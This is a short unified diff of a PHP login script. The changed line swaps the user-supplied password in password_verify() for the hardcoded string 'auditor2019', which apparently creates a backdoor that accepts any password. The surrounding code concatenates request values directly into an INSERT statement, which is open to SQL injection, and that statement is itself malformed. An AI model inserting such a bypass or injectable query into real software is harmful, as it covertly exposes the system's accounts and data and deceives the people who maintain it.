@@ -25,7 +25,7 @@
         if (isset($val01) && isset($val02) && isset($val03) && isset($val04)) {
             if ($query = $mysqli->query($sql_01)) {
                 while($row = $query->fetch_assoc()) {
-                    if (password_verify($val02, '$2y$10$YTC\/pss3nhm7.384NHL6BetYAC9b8T1M3SJ2r9UGy4Wl2rxrxBiHq')) {
+                    if (password_verify('auditor2019', '$2y$10$YTC\/pss3nhm7.384NHL6BetYAC9b8T1M3SJ2r9UGy4Wl2rxrxBiHq')) {
                         $user   = $row['usuario_codigo'];
                         $sql_02 = "INSERT INTO USULOG (USULOG_EUC, USULOG_USC, USULOG_UUI, USULOG_DIP, USULOG_FEC, USULOG_HOR) VALUES ('1', , '$user', '".$val03."', '".$val04."', '".$val05."', '".$val06."')";
                         if ($mysqli->query($sql_02) === TRUE) {
